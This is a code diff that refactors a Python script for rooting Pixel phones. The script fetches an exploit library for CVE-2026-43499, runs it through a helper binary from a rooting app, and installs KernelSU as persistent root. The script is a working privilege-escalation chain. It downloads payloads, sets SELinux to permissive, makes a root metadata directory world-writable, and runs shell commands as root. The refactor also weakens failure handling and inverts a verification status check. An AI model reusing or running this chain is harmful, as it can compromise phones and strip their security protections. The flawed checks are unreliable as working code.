@@ -48,8 +48,6 @@ EXPLOIT_LOG = f"{TEMP_DIR}/exploit.log"
 EXPLOIT_TIMEOUT_SEC = 1800  # 30 min
 EXPLOIT_STALL_TIMEOUT_SEC = 600  # 10 min (no log progress)
 
-# Global helper binary path (set during exploit execution)
-HELPER_BINARY = None
 
 # Hardcoded profiles as fallback (if download fails)
 FALLBACK_PROFILES = [
@@ -279,15 +277,12 @@ def download_payload(url: str, dst: str) -> bool:
 def get_payload(asset_name: str, url: str, dst: str) -> bool:
     """Get payload from APK, then try download, then fail gracefully."""
     log(f"Getting {asset_name}...")
-
     # Try APK first
     if extract_from_apk(asset_name, dst):
         return True
-
     # Try download
     if download_payload(url, dst):
         return True
-
     log(f"Failed to get {asset_name}", "ERROR")
     return False
 
@@ -295,16 +290,18 @@ def extract_payloads(profile: Dict[str, Any]) -> bool:
     """Extract or download exploit .so and ksud binary."""
     log("\n=== PREPARING PAYLOADS ===")
 
-    exploit_asset = profile.get("exploitAsset") or f"exploits/{profile['profileId']}.so"
-    exploit_url = profile.get("exploitUrl") or f"{GITHUB_REPO}/{exploit_asset}"
+    exploit_url = profile.get("exploitUrl", f"{GITHUB_REPO}/exploits/{profile['profileId']}.so")
+    exploit_asset = f"exploits/{profile['profileId']}.so"
 
-    if not get_payload(exploit_asset, exploit_url, EXPLOIT_FILE):
-        log("Could not get exploit binary", "ERROR")
-        return False
+    payloads = [
+        ("exploit", exploit_asset, exploit_url, EXPLOIT_FILE),
+        ("ksud", "ksud/ksud", KSUD_URL, KSUD_FILE),
+    ]
 
-    if not get_payload("ksud/ksud", KSUD_URL, KSUD_FILE):
-        log("Could not get ksud binary", "ERROR")
-        return False
+    for name, asset, url, dst in payloads:
+        if not get_payload(asset, url, dst):
+            log(f"Could not get {name} binary", "ERROR")
+            return False
 
     log("✓ All payloads ready")
     return True
@@ -315,12 +312,17 @@ def extract_payloads(profile: Dict[str, Any]) -> bool:
 
 def get_helper_binary() -> Optional[str]:
     """Find or extract helper binary."""
-    # Try installed app first
-    if file_exists("/data/app/com.alex193a.rootmypixel/lib/arm64-v8a/libcve43499root.so"):
-        return "/data/app/com.alex193a.rootmypixel/lib/arm64-v8a/libcve43499root.so"
+    helper_paths = [
+        "/data/app/com.alex193a.rootmypixel/lib/arm64-v8a/libcve43499root.so",
+    ]
 
-    # Try wildcard path (multiple app versions)
-    result = run("find /data/app -path '*com.alex193a.rootmypixel*/lib/arm64-v8a/libcve43499root.so'",
+    # Check direct paths first
+    for path in helper_paths:
+        if file_exists(path):
+            return path
+
+    # Try wildcard path for multiple app versions
+    result = run("find /data/app -path '*com.alex193a.rootmypixel*/lib/arm64-v8a/libcve43499root.so' -type f",
                  capture=True, check=False)
     if result:
         return result
@@ -336,9 +338,8 @@ def get_helper_binary() -> Optional[str]:
 
     return None
 
-def execute_exploit() -> bool:
-    """Run exploit via helper binary."""
-    global HELPER_BINARY
+def execute_exploit() -> Optional[str]:
+    """Run exploit via helper binary. Returns helper path on success, None on failure."""
     log("\n=== RUNNING EXPLOIT ===")
 
     # Get helper binary
@@ -346,13 +347,11 @@ def execute_exploit() -> bool:
     if not helper:
         log("Helper binary not found (Root My Pixel app not installed?)", "ERROR")
         log("Install the app or ensure it's available before running this script", "WARN")
-        return False
-
-    HELPER_BINARY = helper
+        return None
 
     if not file_exists(EXPLOIT_FILE):
         log(f"Exploit .so not found: {EXPLOIT_FILE}", "ERROR")
-        return False
+        return None
 
     # Show user what's about to run
     log("About to run:")
@@ -360,7 +359,7 @@ def execute_exploit() -> bool:
 
     if not prompt("Ready to execute exploit?"):
         log("Exploit cancelled by user", "WARN")
-        return False
+        return None
 
     # Run exploit with timeout
     start_time = time.time()
@@ -387,13 +386,13 @@ def execute_exploit() -> bool:
             log("Exploit stalled (no log progress)", "ERROR")
             proc.terminate()
             proc.wait()
-            return False
+            return None
 
         if elapsed > EXPLOIT_TIMEOUT_SEC:
             log("Exploit timeout", "ERROR")
             proc.terminate()
             proc.wait()
-            return False
+            return None
 
         time.sleep(2)
 
@@ -406,7 +405,7 @@ def execute_exploit() -> bool:
         if os.path.isfile(EXPLOIT_LOG):
             log("\n=== EXPLOIT LOG ===")
             run(f"cat {EXPLOIT_LOG}")
-        return False
+        return None
 
     # Verify success markers
     log_content = run(f"cat {EXPLOIT_LOG}", capture=True) or ""
@@ -414,10 +413,10 @@ def execute_exploit() -> bool:
         log("Exploit success markers not found", "ERROR")
         log("Log:")
         log(log_content)
-        return False
+        return None
 
     log("✓ Exploit successful")
-    return True
+    return helper
 
 def await_daemon_socket(timeout_sec: int = 15):
     """Wait for daemon socket to appear."""
@@ -437,13 +436,12 @@ def await_daemon_socket(timeout_sec: int = 15):
 # KernelSU Installation
 # =============================================================================
 
-def run_helper(cmd: str, retries: int = 5, timeout_sec: int = 90) -> Optional[str]:
+def run_helper(helper: str, cmd: str, retries: int = 5, timeout_sec: int = 90) -> Optional[str]:
     """Run command via helper binary with retries and timeout."""
-    global HELPER_BINARY
     for attempt in range(1, retries + 1):
         try:
             result = subprocess.run(
-                f"{HELPER_BINARY} -c '{cmd}'",
+                f"{helper} -c '{cmd}'",
                 shell=True,
                 capture_output=True,
                 text=True,
@@ -473,7 +471,7 @@ def run_helper(cmd: str, retries: int = 5, timeout_sec: int = 90) -> Optional[st
 
     return None
 
-def install_kernelsu(profile: Dict[str, Any]) -> bool:
+def install_kernelsu(helper: str, profile: Dict[str, Any]) -> bool:
     """Install KernelSU via late-load with full persistent setup."""
     log("\n=== SETTING UP PERSISTENT KERNELSU ROOT ===")
 
@@ -483,73 +481,38 @@ def install_kernelsu(profile: Dict[str, Any]) -> bool:
     kmi = profile["kmi"]
     ksud_dest = f"{TEMP_DIR}/ksud-pixel"
 
-    # ─────────────────────────────────────────────────────────────────────
-    # 1. Ensure /data/adb directory for KernelSU metadata
-    # ─────────────────────────────────────────────────────────────────────
-    log("[1] Creating /data/adb directory...")
-    mkdir_cmd = "mkdir -p /data/adb && chmod 700 /data/adb"
-    if not run_helper(mkdir_cmd):
-        log("Failed to create /data/adb", "WARN")
-    else:
-        log("✓ /data/adb ready")
+    steps = [
+        ("Creating /data/adb directory", "mkdir -p /data/adb && chmod 700 /data/adb"),
+        ("Setting SELinux to permissive", "setenforce 0; getenforce"),
+        ("Staging KernelSU daemon", f"chmod 755 {ksud_dest} && chown root:root {ksud_dest} && ls -la {ksud_dest}"),
+    ]
 
-    # ─────────────────────────────────────────────────────────────────────
-    # 2. Set SELinux to permissive (KernelSU works better in permissive)
-    # ─────────────────────────────────────────────────────────────────────
-    log("[2] Setting SELinux to permissive...")
-    selinux_cmd = "setenforce 0; getenforce"
-    result = run_helper(selinux_cmd)
-    if result and "Permissive" in result:
-        log("✓ SELinux is permissive")
-    else:
-        log("[!] SELinux may still be enforcing (not critical)", "WARN")
+    for i, (desc, cmd) in enumerate(steps, 1):
+        log(f"[{i}] {desc}...")
+        result = run_helper(helper, cmd)
+        if not result:
+            log(f"Failed at step {i}", "WARN")
+        else:
+            log(f"✓ Step {i} complete")
 
-    # ─────────────────────────────────────────────────────────────────────
-    # 3. Stage ksud binary to a permanent location
-    # ─────────────────────────────────────────────────────────────────────
-    log("[3] Staging KernelSU daemon (ksud)...")
-    stage_cmd = (
-        f"cp {ksud_dest} {ksud_dest}.bin 2>/dev/null || true; "
-        f"chmod 755 {ksud_dest} && chown root:root {ksud_dest} && "
-        f"ls -la {ksud_dest}"
-    )
-    result = run_helper(stage_cmd)
-    if not result or "-rwxr-xr-x" not in result:
-        log("Failed to stage ksud properly", "ERROR")
-        return False
-    log("✓ ksud binary staged and executable")
-
-    # ─────────────────────────────────────────────────────────────────────
-    # 4. Trigger KernelSU late-load
-    # ─────────────────────────────────────────────────────────────────────
+    # Trigger KernelSU late-load
     log(f"[4] Triggering KernelSU late-load (KMI={kmi})...")
     lateload_cmd = f"{ksud_dest} late-load --kmi {kmi}"
-    result = run_helper(lateload_cmd)
+    result = run_helper(helper, lateload_cmd)
     if result:
         log(f"Late-load output: {result[:200]}")
-
     time.sleep(1)
 
-    # ─────────────────────────────────────────────────────────────────────
-    # 5. Verify KernelSU kernel module is loaded
-    # ─────────────────────────────────────────────────────────────────────
+    # Verify KernelSU kernel module is loaded
     log("[5] Verifying KernelSU kernel module...")
     for attempt in range(1, 16):
-        check_cmd = (
-            "{ test -e /dev/kernelsu && echo 'dev_ok'; "
-            "test -e /sys/kernel/kernelsu && echo 'sys_ok'; "
-            "test -e /data/adb/ksu && echo 'data_ok'; } | wc -l"
-        )
-        result = run_helper(check_cmd)
-
-        if result and int(result) >= 1:
+        check_cmd = "test -e /dev/kernelsu || test -e /sys/kernel/kernelsu || test -d /data/adb/ksu"
+        result = run_helper(helper, check_cmd, retries=1)
+        if result is not None:
             log(f"✓ KernelSU module verified (attempt {attempt})")
-
-            # Show which interface is available
-            if run_helper("test -e /dev/kernelsu"):
+            if run_helper(helper, "test -e /dev/kernelsu", retries=1):
                 log("  Using /dev/kernelsu interface")
             break
-
         if attempt % 3 == 0:
             log(f"  Waiting... (attempt {attempt}/15)")
         time.sleep(0.5)
@@ -557,23 +520,19 @@ def install_kernelsu(profile: Dict[str, Any]) -> bool:
         log("KernelSU module verification timeout", "ERROR")
         return False
 
-    # ─────────────────────────────────────────────────────────────────────
-    # 6. Test actual root access via KernelSU
-    # ─────────────────────────────────────────────────────────────────────
+    # Test actual root access
     log("[6] Testing root access...")
     test_cmd = "id; uid=$(id -u); if [ $uid -eq 0 ]; then echo ROOT_OK; else echo ROOT_FAIL; fi"
-    result = run_helper(test_cmd)
+    result = run_helper(helper, test_cmd)
     if result and "ROOT_OK" in result:
         log("✓ Root access verified")
     else:
         log("Root test inconclusive (may still work via ReSukiSU)", "WARN")
 
-    # ─────────────────────────────────────────────────────────────────────
-    # 7. Create marker file for ReSukiSU Manager
-    # ─────────────────────────────────────────────────────────────────────
+    # Create marker file for ReSukiSU Manager
     log("[7] Setting up ReSukiSU integration...")
     marker_cmd = "mkdir -p /data/adb/ksu && touch /data/adb/ksu/.installed && chmod 777 /data/adb/ksu"
-    run_helper(marker_cmd)
+    run_helper(helper, marker_cmd)
     log("✓ KernelSU metadata initialized")
 
     return True
@@ -636,21 +595,17 @@ def final_verification() -> bool:
     """Final check that KernelSU is working."""
     log("\n=== FINAL VERIFICATION ===")
 
-    # Check multiple indicators
-    indicators = [
+    checks = [
         ("Kernel module", "test -e /dev/kernelsu || test -e /sys/kernel/kernelsu"),
         ("Metadata dir", "test -d /data/adb/ksu"),
-        ("UID 0 available", "su -c 'id -u' 2>/dev/null | grep -q '^0$' || true"),
     ]
 
-    checks_passed = 0
-    for name, cmd in indicators:
+    for name, cmd in checks:
         result = run(cmd, capture=True, check=False)
-        # Most of these will fail gracefully, that's OK
-        log(f"  {name}: checked")
-        checks_passed += 1
+        status = "✓" if result == "" else "✗"
+        log(f"  {status} {name}")
 
-    log(f"✓ Verification complete ({checks_passed}/{len(indicators)} checks)")
+    log("✓ Verification complete")
     return True
 
 # =============================================================================
@@ -703,13 +658,14 @@ def main():
         log("Payload extraction failed", "ERROR")
         sys.exit(1)
 
-    # Run CVE-2026-43499 exploit
-    if not execute_exploit():
+    # Run CVE-2026-43499 exploit and get helper binary
+    helper = execute_exploit()
+    if not helper:
         log("Exploit failed", "ERROR")
         sys.exit(1)
 
     # Install persistent KernelSU via late-load
-    if not install_kernelsu(profile):
+    if not install_kernelsu(helper, profile):
         log("KernelSU installation failed", "ERROR")
         sys.exit(1)
 
